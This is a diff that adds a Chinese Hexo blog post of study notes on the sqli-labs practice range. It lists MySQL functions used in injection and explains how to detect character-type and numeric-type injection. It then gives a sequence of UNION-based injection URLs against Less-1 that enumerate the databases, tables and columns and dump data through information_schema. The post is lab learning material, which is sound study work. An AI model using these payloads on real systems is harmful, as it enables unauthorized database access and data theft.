@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.11.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="关于SQL注入在练习靶场之前，我们首先要了解什么是SQL注入。SQL注入常常发生在通过网页获取用户输入的数据并将其插入MySQL数据库中，黑客通过把SQL命令插入到域名、web表单等手段达到欺骗服务器的目的，因此网站都会对用户输入的数据进行过滤来进行保护。 而在练习靶场中，我们就需要通过SQL注入的方式获得数据库中的数据，下面我就总结一下在一到六关我所用到的知识。 1.首先先了解一下数据库常用函数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlilab1">
+<meta property="og:url" content="http://example.com/2022/12/01/sqlilab1/index.html">
+<meta property="og:site_name" content="归根">
+<meta property="og:description" content="关于SQL注入在练习靶场之前，我们首先要了解什么是SQL注入。SQL注入常常发生在通过网页获取用户输入的数据并将其插入MySQL数据库中，黑客通过把SQL命令插入到域名、web表单等手段达到欺骗服务器的目的，因此网站都会对用户输入的数据进行过滤来进行保护。 而在练习靶场中，我们就需要通过SQL注入的方式获得数据库中的数据，下面我就总结一下在一到六关我所用到的知识。 1.首先先了解一下数据库常用函数">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-11-30T16:58:44.000Z">
+<meta property="article:modified_time" content="2023-03-13T12:58:40.270Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/2022/12/01/sqlilab1/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2022/12/01/sqlilab1/","path":"2022/12/01/sqlilab1/","title":"sqlilab1"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>sqlilab1 | 归根</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">归根</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description">浮生若梦</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/01/sqlilab1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="归根">
+      <meta itemprop="description" content="浮生若梦">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="sqlilab1 | 归根">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sqlilab1
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-12-01 00:58:44" itemprop="dateCreated datePublished" datetime="2022-12-01T00:58:44+08:00">2022-12-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-03-13 20:58:40" itemprop="dateModified" datetime="2023-03-13T20:58:40+08:00">2023-03-13</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>关于SQL注入<br>在练习靶场之前，我们首先要了解什么是SQL注入。SQL注入常常发生在通过网页获取用户输入的数据并将其插入MySQL数据库中，黑客通过把SQL命令插入到域名、web表单等手段达到欺骗服务器的目的，因此网站都会对用户输入的数据进行过滤来进行保护。</p>
+<p>而在练习靶场中，我们就需要通过SQL注入的方式获得数据库中的数据，下面我就总结一下在一到六关我所用到的知识。</p>
+<p>1.首先先了解一下数据库常用函数与参数。<br>&#x3D;、&gt;、&gt;&#x3D;、&lt;&#x3D; 、&lt;&gt;</p>
+<p>比较运算符</p>
+<p>and、or</p>
+<p>逻辑运算符</p>
+<p>version( )</p>
+<p>mysql数据库版本</p>
+<p>database( )</p>
+<p>当前数据库名</p>
+<p>sleep( )</p>
+<p>睡眠时间为指定的秒数</p>
+<p>if(true,t,f)</p>
+<p>if判断</p>
+<p>length( )</p>
+<p>返回字符串的长度</p>
+<p>substring( )</p>
+<p>截取字符串</p>
+<p>三个函数作用相同</p>
+<p>有三个参数 mid(“1”,2,3)</p>
+<p>1.截取的字符串</p>
+<p>2.截取起始位置，从1开始计数</p>
+<p>3.截取长度</p>
+<p>substr( )</p>
+<p>mid( )</p>
+<p>left( )</p>
+<p>从左侧开始取指定字符个数的字符串</p>
+<p>concat( )</p>
+<p>没有分隔符的连接字符串</p>
+<p>concat_ws ( )</p>
+<p>含有分割符的连接字符串</p>
+<p>group_conat( )</p>
+<p>连接一个组的字符串</p>
+<p>ord( )</p>
+<p>返回ASCII码</p>
+<p>ascii( )</p>
+<p>hex( )</p>
+<p>将字符串转换为十六进制</p>
+<p>unhex( )</p>
+<p>hex的反向操作</p>
+<p>md5( )</p>
+<p>返回MD5值</p>
+<p>floor(x)</p>
+<p>返回不大于x的最大整数</p>
+<p>round ( )</p>
+<p>返回参数x接近的整数</p>
+<p>rand( )</p>
+<p>返回0-1之间的随机浮点数</p>
+<p>load_file( )</p>
+<p>读取文件，并返回文件内容作为一个字符串</p>
+<p>find_in_set( )</p>
+<p>返回字符串在字符串列表中的位置</p>
+<p>benchmark( )</p>
+<p>指定语句执行的次数</p>
+<p>name_const ( )</p>
+<p>返回表作为结果</p>
+<p>user( )</p>
+<p>用户名</p>
+<p>current_user( )</p>
+<p>当前用户名</p>
+<p>system_ user( )</p>
+<p>系统用户名</p>
+<p>@@datadir</p>
+<p>数据库路径</p>
+<p>@@versoin_compile_os</p>
+<p>操作系统版本</p>
+<p>mysql5.0版本之后，会在数据库中存放一个information_schema的数据库，在该库，我们需要记住三个表名，分别是schemata，tables，colums</p>
+<p>在schemata表中存储该用户创建的所有数据库的库名，在该表中 记录数据库库名的字段名为：schema_name</p>
+<p>tables中存储该用户创建的所有数据的库名和表名，在这个表中记录数据库库名和表名的字段名分别为 table_schema和table_name</p>
+<p>columns表存储该用户创建的所有数据库的库名，表名和字段名，在该表中记录数据库库名，表名和字段名的字段名为table_schema,table_name,column_name;<br>2.我们可以通过这样判断存在注入。<br>若在GET请求中?id&#x3D;1 and 1&#x3D;1和?id&#x3D;1 and 1&#x3D;2都没有报错，则是字符型注入。<br>若在GET请求中?id&#x3D;1 and 1&#x3D;1没有报错，但是?id&#x3D;1 and 1&#x3D;2有异常或没回显，则是数字型注入。<br>因为若注入 ?id&#x3D;1 and 1&#x3D;2 ，则数据库中查询语句为： select * from user where id&#x3D;’1 and 1&#x3D;2’;因为id为int类型，所以传入的 ‘1 and 1&#x3D;2’ 会强制转换成 ‘1’ ，&#x3D;&gt;最终数据库中的查询语句为：select * from user where id&#x3D;’1’;所以sql语句不会报错。</p>
+<p>若是数字型注入，注入 ?id&#x3D;1 and 1&#x3D;2 时的SQL语句为：select * from users where id&#x3D;1 and 1&#x3D;2 因为 select * from users where id&#x3D;1 是正确的语句 ，and 后面的 1&#x3D;2 是错误的语句，所以select * from users where id&#x3D;1 and 1&#x3D;2 会有异常或着网页没有回显（当一个错误的语句和一个正确的语句用and连接符连接时，整体就会是错误的 ）。</p>
+<p>3.联合注入<br>判断有几列（能正常显示到几就是有几行）：</p>
+<p>1<br>sqli&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1’ order by n–+(此处n为列数）<br>使用union,id&#x3D;错误值<br>3、判断回显点（联合查询时代替可以显示的数字）：</p>
+<p>1<br><a target="_blank" rel="noopener" href="http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,3--+">http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,3--+</a><br>4、获得全部数据库名称：</p>
+<p>1<br><a target="_blank" rel="noopener" href="http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,group_concat(schema_name)%20from%20information_schema.schemata--+">http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,group_concat(schema_name)%20from%20information_schema.schemata--+</a><br>5、获得当前数据库名字：</p>
+<p>1<br><a target="_blank" rel="noopener" href="http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,database()--+">http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,database()--+</a><br>6、获得数据库内所有表的名称：</p>
+<p>1<br><a target="_blank" rel="noopener" href="http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%27--+">http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27数据库名%27--+</a><br>7、获得数据表中每列的名称：</p>
+<p>1<br><a target="_blank" rel="noopener" href="http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27%E8%A1%A8%E5%90%8D%27--+">http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27表名%27--+</a><br>8、我们就可以获得我们想要的信息了：</p>
+<p>1<br><a target="_blank" rel="noopener" href="http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,group_concat(%E5%88%97%E5%90%8D)%20from%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D.%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%90%8D--+">http://sqli/sqli/Less-1/?id=-1%27%20union%20select%201,2,group_concat(列名)%20from%20数据库名.数据表名--+</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/11/25/mysql/" rel="prev" title="mysql">
+                  <i class="fa fa-chevron-left"></i> mysql
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/03/13/1-4/" rel="next" title="sql 1-4">
+                  sql 1-4 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
